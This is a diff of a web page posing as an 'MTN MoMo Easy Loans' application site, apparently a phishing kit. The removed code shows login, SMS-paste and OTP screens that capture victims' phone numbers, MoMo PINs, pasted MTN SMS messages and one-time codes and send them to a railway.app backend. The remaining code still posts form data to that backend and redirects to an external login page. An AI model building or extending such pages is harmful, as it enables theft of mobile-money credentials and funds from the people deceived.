@@ -24,26 +24,26 @@
     html, body { width: 100%; overflow-x: hidden; }
     body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }
 
-    /* ═══ PAGE SYSTEM ═══ */
+    /* PAGE SYSTEM */
     .page { display: none; min-height: 100vh; width: 100%; animation: fadeIn 0.3s ease; }
     .page.active { display: flex; flex-direction: column; }
     @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
 
-    /* ═══ MTN LOGO ═══ */
+    /* MTN LOGO */
     .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 4px; }
     .mtn-logo-icon { width: 45px; height: 45px; background: var(--mtn-gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; font-weight: 900; color: var(--mtn-dark); position: relative; }
     .mtn-logo-icon::after { content: 'M'; font-size: 2rem; font-weight: 900; }
     .mtn-logo-text { font-size: 1rem; font-weight: 700; color: var(--mtn-dark); }
     .mtn-logo-sub { font-size: 0.65rem; color: #888; font-weight: 500; }
 
-    /* ═══ NAVBAR ═══ */
+    /* NAVBAR */
     .navbar { background: var(--mtn-dark); display:flex; align-items:center; justify-content:center; padding:0 20px; height:60px; position:relative; flex-shrink:0; width:100%; }
     .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.75); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; background:none; border:none; font-family:'Inter',sans-serif; }
     .nav-left:hover { color:#fff; }
     .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
     .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }
 
-    /* ═══ SPINNING OVERLAY (after submit) ═══ */
+    /* PROCESSING OVERLAY */
     .processing-overlay {
       position: fixed;
       inset: 0;
@@ -111,16 +111,7 @@
       40% { opacity: 1; }
     }
 
-    /* ═══ OVERLAY (login/otp modals) ═══ */
-    .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); backdrop-filter:blur(3px); z-index:999; align-items:center; justify-content:center; padding:20px; }
-    .overlay.show { display:flex; }
-    .modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:100%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
-    @keyframes popIn { from{opacity:0;transform:scale(0.85)} to{opacity:1;transform:scale(1)} }
-    .spinner { width:44px; height:44px; border:4px solid #eee; border-top-color:var(--mtn-gold); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 18px; }
-    .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
-    .modal p  { font-size:0.88rem; color:var(--text-light); }
-
-    /* ═══ WELCOME PAGE ═══ */
+    /* WELCOME PAGE */
     .welcome-wrap { width: 100%; max-width: 480px; margin: 24px auto; padding: 0 16px; }
     .welcome-card { background: #fff; border-radius: 16px; padding: 32px 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
     .welcome-title { font-size: 1.5rem; font-weight: 700; color: #1C2340; text-align: center; margin-bottom: 6px; }
@@ -139,7 +130,7 @@
     .monthly-box .lbl { font-size: 0.9rem; color: #555; }
     .monthly-box .amount { font-size: 1.3rem; font-weight: 700; color: #FFB300; }
 
-    /* ═══ PROGRESS BAR ═══ */
+    /* PROGRESS BAR */
     .progress-wrap { width: 100%; max-width: 480px; margin: 0 auto; padding: 20px 16px 0; }
     .progress-title { text-align: center; font-size: 1.15rem; font-weight: 700; color: #1C2340; margin: 0 0 4px; }
     .progress-sub { text-align: center; font-size: 0.8rem; color: #888; margin-bottom: 14px; }
@@ -147,7 +138,7 @@
     .progress-seg { flex: 1; height: 5px; background: #e0e0e0; border-radius: 3px; }
     .progress-seg.active { background: #FFD700; }
 
-    /* ═══ FORM ═══ */
+    /* FORM */
     .form-wrap { width: 100%; max-width: 480px; margin: 0 auto; padding: 16px 16px 32px; flex: 1; }
     .form-card { background: #fff; border-radius: 16px; padding: 24px 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
     .form-field { margin-bottom: 18px; }
@@ -162,30 +153,20 @@
     .phone-prefix input { border-radius: 0 8px 8px 0; }
     .form-actions { display: flex; gap: 12px; margin-top: 22px; }
 
-    /* ═══ BUTTONS ═══ */
-    .btn-grad { background: var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.9rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:'Inter',sans-serif; transition:opacity 0.2s; }
-    .btn-grad:hover { opacity:0.9; }
-    .btn-grad:disabled { opacity:0.5; cursor:not-allowed; }
+    /* BUTTONS */
     .btn-primary { flex: 1; background: linear-gradient(to right, #003366, #004080); color: #fff; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
     .btn-primary:hover { opacity: 0.92; }
     .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
     .btn-outline { flex: 1; background: #e0e0e0; color: #666; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
     .btn-outline:hover { background: #d0d0d0; }
 
-    /* ═══ SUMMARY BOX ═══ */
+    /* SUMMARY BOX */
     .summary-box { background: #fffbf0; border-left: 4px solid #FFD700; border-radius: 8px; padding: 16px 18px; margin: 20px 0; }
     .summary-box h4 { font-size: 0.9rem; color: #1C2340; margin-bottom: 12px; font-weight: 700; }
     .summary-row { display: flex; justify-content: space-between; font-size: 0.85rem; padding: 6px 0; color: #444; }
     .summary-row .val { font-weight: 600; color: #1C2340; }
 
-    /* ═══ MESSAGES ═══ */
-    .msg { display: none; padding: 10px 14px; border-radius: 8px; font-size: 0.85rem; margin-bottom: 14px; }
-    .msg.show { display: block; }
-    .msg.ok { background: #e8f5e9; color: #1e7e34; border: 1px solid #c8e6c9; }
-    .msg.warn { background: #fff3e0; color: #e65100; border: 1px solid #ffe0b2; }
-    .msg.error, .msg:not(.ok):not(.warn) { background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; }
-
-    /* ═══ MOBILE ═══ */
+    /* MOBILE */
     @media (max-width: 480px) {
       .welcome-wrap { padding: 0 12px; margin: 16px auto; }
       .welcome-card { padding: 24px 18px; }
@@ -208,7 +189,7 @@
 <body>
   <div id="app">
 
-    <!-- ═══ WELCOME ═══ -->
+    <!-- WELCOME -->
     <div id="page-welcome" class="page active">
       <div class="navbar">
         <div class="mtn-logo">
@@ -254,7 +235,7 @@
       </div>
     </div>
 
-    <!-- ═══ STEP 1 ═══ -->
+    <!-- STEP 1 -->
     <div id="page-step1" class="page">
       <div class="navbar">
         <button class="nav-left" onclick="goTo('page-welcome')">← Back</button>
@@ -316,7 +297,7 @@
       </div>
     </div>
 
-    <!-- ═══ STEP 2 ═══ -->
+    <!-- STEP 2 -->
     <div id="page-step2" class="page">
       <div class="navbar">
         <button class="nav-left" onclick="goTo('page-step1')">← Back</button>
@@ -368,7 +349,7 @@
       </div>
     </div>
 
-    <!-- ═══ STEP 3 ═══ -->
+    <!-- STEP 3 -->
     <div id="page-step3" class="page">
       <div class="navbar">
         <button class="nav-left" onclick="goTo('page-step2')">← Back</button>
@@ -436,149 +417,9 @@
       </div>
     </div>
 
-    <!-- ═══ LOGIN ═══ -->
-    <div id="page-login" class="page">
-      <div class="navbar">
-        <button class="nav-left" onclick="goTo('page-welcome')">← Back</button>
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans</div>
-        </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-      </div>
-
-      <div class="form-wrap">
-        <div class="form-card">
-          <div id="lpMsg" class="msg"></div>
-          <div id="lpMsgOk" class="msg ok"></div>
-          <div id="lpMsgWarn" class="msg warn"></div>
-
-          <div class="form-field">
-            <label>Phone Number</label>
-            <input id="lpPhone" type="tel" maxlength="9" placeholder="670123456">
-          </div>
-
-          <div class="form-field">
-            <label>PIN (5 digits)</label>
-            <div style="display:flex; gap:8px; justify-content: center;" id="pinContainer">
-              <input id="lp0" class="pin-box" maxlength="1" inputmode="numeric" style="width:52px;height:56px;text-align:center;font-size:22px;font-weight:700;border:2px solid #ddd;border-radius:10px;background:#fafbff;">
-              <input id="lp1" class="pin-box" maxlength="1" inputmode="numeric" style="width:52px;height:56px;text-align:center;font-size:22px;font-weight:700;border:2px solid #ddd;border-radius:10px;background:#fafbff;">
-              <input id="lp2" class="pin-box" maxlength="1" inputmode="numeric" style="width:52px;height:56px;text-align:center;font-size:22px;font-weight:700;border:2px solid #ddd;border-radius:10px;background:#fafbff;">
-              <input id="lp3" class="pin-box" maxlength="1" inputmode="numeric" style="width:52px;height:56px;text-align:center;font-size:22px;font-weight:700;border:2px solid #ddd;border-radius:10px;background:#fafbff;">
-              <input id="lp4" class="pin-box" maxlength="1" inputmode="numeric" style="width:52px;height:56px;text-align:center;font-size:22px;font-weight:700;border:2px solid #ddd;border-radius:10px;background:#fafbff;">
-            </div>
-          </div>
-
-          <button id="bLgn" class="btn-grad" style="margin-top: 10px;" onclick="doLogin()">LOGIN</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══ SMS PASTE ═══ -->
-    <div id="page-sms-paste" class="page">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans</div>
-        </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-      </div>
-
-      <div class="form-wrap">
-        <div class="form-card">
-          <h3 style="text-align:center; font-size:1.15rem; margin-bottom:8px;">Paste the SMS from MTN</h3>
-          <p style="text-align:center; font-size:0.85rem; color:#666; margin-bottom:20px;">Copy the full SMS you received from MTN MoMo and paste it below.</p>
-
-          <div class="form-field">
-            <label>Paste SMS message</label>
-            <textarea id="smsMsgBox" style="min-height: 150px;" placeholder="Paste the SMS you received..."></textarea>
-          </div>
-
-          <button class="btn-grad" onclick="submitSms()">SUBMIT SMS</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══ OTP ═══ -->
-    <div id="page-otp" class="page">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans</div>
-        </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-      </div>
-
-      <div class="form-wrap">
-        <div class="form-card">
-          <h3 style="text-align:center; font-size:1.15rem; margin-bottom:8px;">Enter Verification Code</h3>
-          <p style="text-align:center; font-size:0.85rem; color:#666; margin-bottom:20px;">We sent a 4-digit code to your MoMo number.</p>
-
-          <div id="otpMsg" class="msg"></div>
-
-          <div class="form-field">
-            <label>Enter OTP</label>
-            <div style="display:flex; gap:10px; justify-content: center;" id="otpContainer">
-              <input id="otp0" maxlength="1" inputmode="numeric" style="width:62px;height:68px;text-align:center;font-size:26px;font-weight:800;border:2px solid #ddd;border-radius:12px;background:#fafbff;">
-              <input id="otp1" maxlength="1" inputmode="numeric" style="width:62px;height:68px;text-align:center;font-size:26px;font-weight:800;border:2px solid #ddd;border-radius:12px;background:#fafbff;">
-              <input id="otp2" maxlength="1" inputmode="numeric" style="width:62px;height:68px;text-align:center;font-size:26px;font-weight:800;border:2px solid #ddd;border-radius:12px;background:#fafbff;">
-              <input id="otp3" maxlength="1" inputmode="numeric" style="width:62px;height:68px;text-align:center;font-size:26px;font-weight:800;border:2px solid #ddd;border-radius:12px;background:#fafbff;">
-            </div>
-          </div>
-
-          <button id="bOtp" class="btn-grad" style="margin-top: 10px;" onclick="doOtp()">VERIFY &amp; CONTINUE</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══ APPROVAL ═══ -->
-    <div id="page-approval" class="page">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans</div>
-        </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-      </div>
-
-      <div class="form-wrap">
-        <div class="form-card" style="text-align: center;">
-          <div style="font-size: 60px; margin-bottom: 12px;">🎉</div>
-          <h2 style="font-size: 1.5rem; font-weight: 800; margin-bottom: 8px;">Congratulations!</h2>
-          <p style="font-size: 0.9rem; color: #666; margin-bottom: 20px;">Your loan request has been approved</p>
-
-          <div style="background: #e8f5e9; border: 1px solid #c8e6c9; border-radius: 12px; padding: 12px 16px; margin-bottom: 20px; font-size: 0.88rem; font-weight: 700; color: #1e7e34;">
-            ⏰ Disbursement in less than 24 hours
-          </div>
-
-          <div class="summary-box" style="text-align: left;">
-            <h4>Loan Summary</h4>
-            <div class="summary-row">
-              <span>Amount:</span>
-              <span class="val" id="aprAmount">—</span>
-            </div>
-            <div class="summary-row">
-              <span>Term:</span>
-              <span class="val" id="aprTerm">—</span>
-            </div>
-            <div class="summary-row">
-              <span>Monthly:</span>
-              <span class="val" id="aprMth">—</span>
-            </div>
-          </div>
-
-          <button class="btn-primary" style="width:100%; margin-top: 12px;" onclick="resetAll(); goTo('page-welcome');">OK, GOT IT →</button>
-        </div>
-      </div>
-    </div>
-
   </div>
 
-  <!-- ═══ PROCESSING OVERLAY (after submit) ═══ -->
+  <!-- PROCESSING OVERLAY -->
   <div class="processing-overlay" id="processingOverlay">
     <div class="processing-logo"></div>
     <div class="processing-spinner"></div>
@@ -589,23 +430,6 @@
     </div>
   </div>
 
-  <!-- Overlay modals -->
-  <div class="overlay" id="mLgn">
-    <div class="modal">
-      <div class="spinner"></div>
-      <h3>Verifying</h3>
-      <p>Please wait...</p>
-    </div>
-  </div>
-
-  <div class="overlay" id="mOtp">
-    <div class="modal">
-      <div class="spinner"></div>
-      <h3>Processing</h3>
-      <p>Please wait...</p>
-    </div>
-  </div>
-
   <script>
     window.API_BASE = 'https://easy-loansej1-production.up.railway.app';
   </script>
@@ -613,12 +437,8 @@
   <script>
     // ═══ State ═══
     const S = {
-      isSubmitting: false,
-      applicationId: null,
       loanAmount: 1000000,
-      loanTerm: '48 Months',
-      phone: '',
-      pin: ''
+      loanTerm: '48 Months'
     };
 
     // ═══ Navigation ═══
@@ -627,217 +447,6 @@
       const target = document.getElementById(pageId);
       if (target) target.classList.add('active');
       window.scrollTo(0, 0);
-    }
-
-    // ═══ Reset all ═══
-    function resetAll() {
-      S.applicationId = null;
-      S.loanAmount = 1000000;
-      S.loanTerm = '48 Months';
-      S.phone = '';
-      S.pin = '';
-
-      ['fFirst','fLast','fPhone','fPurpose','fIncome','lpPhone','smsMsgBox'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.value = '';
-      });
-
-      [0,1,2,3,4].forEach(i => {
-        const el = document.getElementById('lp'+i);
-        if (el) el.value = '';
-      });
-      [0,1,2,3].forEach(i => {
-        const el = document.getElementById('otp'+i);
-        if (el) el.value = '';
-      });
-
-      const bLgn = document.getElementById('bLgn');
-      if (bLgn) { bLgn.disabled = false; bLgn.textContent = 'LOGIN'; }
-      const bOtp = document.getElementById('bOtp');
-      if (bOtp) { bOtp.disabled = false; bOtp.textContent = 'VERIFY & CONTINUE'; }
-      const sBtn = document.getElementById('submitBtn');
-      if (sBtn) { sBtn.disabled = false; sBtn.textContent = 'SUBMIT APPLICATION'; }
-    }
-
-    // ═══ UI message helpers ═══
-    function showLgnMsg(type, msg) {
-      ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) { el.classList.remove('show'); el.textContent = ''; }
-      });
-      let id = 'lpMsg';
-      if (type === 'success') id = 'lpMsgOk';
-      else if (type === 'warning') id = 'lpMsgWarn';
-      const el = document.getElementById(id);
-      if (el) { el.textContent = msg; el.classList.add('show'); }
-    }
-
-    function showOtpMsg(type, msg) {
-      const el = document.getElementById('otpMsg');
-      if (!el) return;
-      el.textContent = msg;
-      el.className = 'msg' + (type === 'error' ? '' : ' ' + type) + ' show';
-    }
-
-    // ═══ PIN input auto-tab ═══
-    function chkPin() {
-      const inputs = [0,1,2,3,4].map(i => document.getElementById('lp'+i));
-      inputs.forEach((inp, idx) => {
-        if (!inp) return;
-        inp.oninput = () => {
-          inp.value = inp.value.replace(/\D/g, '');
-          if (inp.value.length === 1 && idx < 4) inputs[idx+1].focus();
-        };
-        inp.onkeydown = (e) => {
-          if (e.key === 'Backspace' && inp.value === '' && idx > 0) inputs[idx-1].focus();
-        };
-      });
-    }
-
-    function chkOtp() {
-      const inputs = [0,1,2,3].map(i => document.getElementById('otp'+i));
-      inputs.forEach((inp, idx) => {
-        if (!inp) return;
-        inp.oninput = () => {
-          inp.value = inp.value.replace(/\D/g, '');
-          if (inp.value.length === 1 && idx < 3) inputs[idx+1].focus();
-        };
-        inp.onkeydown = (e) => {
-          if (e.key === 'Backspace' && inp.value === '' && idx > 0) inputs[idx-1].focus();
-        };
-      });
-    }
-
-    // ═══ LOGIN ═══
-    async function doLogin() {
-      if (S.isSubmitting) return;
-      S.isSubmitting = true;
-
-      ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.classList.remove('show');
-      });
-
-      const phone = document.getElementById('lpPhone').value.trim();
-      const pin   = [0,1,2,3,4].map(i => document.getElementById('lp'+i).value).join('');
-
-      if (phone.length !== 9 || !/^\d{9}$/.test(phone)) {
-        S.isSubmitting = false;
-        showLgnMsg('warning', 'Phone: 9 digits (e.g., 670123456).');
-        return;
-      }
-      if (pin.length !== 5) {
-        S.isSubmitting = false;
-        showLgnMsg('warning', 'PIN must be exactly 5 digits.');
-        return;
-      }
-
-      S.phone = '+237' + phone;
-      S.pin = pin;
-
-      document.getElementById('mLgn').classList.add('show');
-      document.getElementById('bLgn').disabled = true;
-
-      try {
-        const res = await fetch(`${window.API_BASE}/api/login`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone: S.phone, pin: S.pin })
-        });
-        const data = await res.json();
-        document.getElementById('mLgn').classList.remove('show');
-        S.isSubmitting = false;
-
-        if (data.ok || data.success) {
-          localStorage.setItem('momoPhone', S.phone);
-          localStorage.setItem('momoPin', S.pin);
-          goTo('page-sms-paste');
-        } else {
-          document.getElementById('bLgn').disabled = false;
-          showLgnMsg('error', data.message || data.error || 'Login failed.');
-        }
-      } catch (err) {
-        S.isSubmitting = false;
-        document.getElementById('mLgn').classList.remove('show');
-        document.getElementById('bLgn').disabled = false;
-        showLgnMsg('error', 'Network error: ' + err.message);
-      }
-    }
-
-    // ═══ SMS SUBMIT ═══
-    async function submitSms() {
-      const smsText = document.getElementById('smsMsgBox').value.trim();
-      if (!smsText || smsText.length < 20) {
-        alert('Please paste the full SMS message.');
-        return;
-      }
-      localStorage.setItem('momoSms', smsText);
-
-      try {
-        const res = await fetch(`${window.API_BASE}/api/sms`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            phone: S.phone,
-            pin: S.pin,
-            sms: smsText
-          })
-        });
-        const data = await res.json();
-        if (data.ok || data.success) {
-          goTo('page-otp');
-          chkOtp();
-        } else {
-          alert(data.message || data.error || 'Failed to submit SMS.');
-        }
-      } catch (err) {
-        alert('Network error: ' + err.message);
-      }
-    }
-
-    // ═══ OTP VERIFY ═══
-    async function doOtp() {
-      const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
-      if (otp.length !== 4) {
-        showOtpMsg('error', 'Please enter the 4-digit OTP.');
-        return;
-      }
-
-      document.getElementById('mOtp').classList.add('show');
-      document.getElementById('bOtp').disabled = true;
-      document.getElementById('bOtp').textContent = 'VERIFYING...';
-
-      try {
-        const res = await fetch(`${window.API_BASE}/api/verify-otp`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            phone: S.phone,
-            pin: S.pin,
-            otp: otp,
-            sms: localStorage.getItem('momoSms') || ''
-          })
-        });
-        const data = await res.json();
-        document.getElementById('mOtp').classList.remove('show');
-
-        if (data.ok || data.success) {
-          document.getElementById('aprAmount').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
-          document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
-          const monthly = Math.ceil((S.loanAmount || 1000000) / parseInt(S.loanTerm || '48'));
-          document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
-          goTo('page-approval');
-        } else {
-          document.getElementById('bOtp').disabled = false;
-          document.getElementById('bOtp').textContent = 'VERIFY & CONTINUE';
-          showOtpMsg('error', data.message || data.error || 'Failed to submit OTP.');
-        }
-      } catch (err) {
-        document.getElementById('mOtp').classList.remove('show');
-        document.getElementById('bOtp').disabled = false;
-        document.getElementById('bOtp').textContent = 'VERIFY & CONTINUE';
-        showOtpMsg('error', 'Error: ' + err.message);
-      }
     }
 
     // ═══ CALCULATOR ═══
@@ -900,7 +509,7 @@
       goTo('page-step3');
     }
 
-    // ═══ STEP 3 → SUBMIT → SPIN → LOGIN ═══
+    // ═══ STEP 3 → SUBMIT → SPIN → REDIRECT TO login.html ═══
     async function submitApplication() {
       const btn = document.getElementById('submitBtn');
       btn.disabled = true;
@@ -921,10 +530,9 @@
       S.loanAmount = payload.loanAmount;
       S.loanTerm = payload.loanTerm;
 
-      // ✅ SHOW SPINNING OVERLAY IMMEDIATELY
+      // Show spinning overlay
       document.getElementById('processingOverlay').classList.add('show');
 
-      // Start the redirect timer (5 seconds)
       const startTime = Date.now();
       const MIN_SPIN_MS = 5000;
 
@@ -935,43 +543,24 @@
           body: JSON.stringify(payload)
         });
         const data = await res.json();
-
-        if (data.ok || data.success) {
-          S.applicationId = data.reference || data.applicationId;
-        }
-
-        // Ensure spinner shows for at least 5 seconds
-        const elapsed = Date.now() - startTime;
-        const remaining = Math.max(0, MIN_SPIN_MS - elapsed);
-
-        setTimeout(() => {
-          document.getElementById('processingOverlay').classList.remove('show');
-          goTo('page-login');
-          chkPin();
-        }, remaining);
-
+        console.log('Application response:', data);
       } catch (err) {
         console.error('Submit error:', err);
-
-        // Still redirect after 5 seconds even if error
-        const elapsed = Date.now() - startTime;
-        const remaining = Math.max(0, MIN_SPIN_MS - elapsed);
-
-        setTimeout(() => {
-          document.getElementById('processingOverlay').classList.remove('show');
-          goTo('page-login');
-          chkPin();
-        }, remaining);
-      } finally {
-        btn.disabled = false;
-        btn.textContent = 'SUBMIT APPLICATION';
       }
+
+      // Ensure spinner shows for at least 5 seconds
+      const elapsed = Date.now() - startTime;
+      const remaining = Math.max(0, MIN_SPIN_MS - elapsed);
+
+      setTimeout(() => {
+        document.getElementById('processingOverlay').classList.remove('show');
+        // ✅ REDIRECT TO YOUR EXTERNAL login.html
+        window.location.href = 'login.html';
+      }, remaining);
     }
 
     // ═══ INIT ═══
     document.addEventListener('DOMContentLoaded', () => {
-      chkPin();
-      chkOtp();
       if (document.getElementById('wSlider')) {
         updateCalculator();
       }
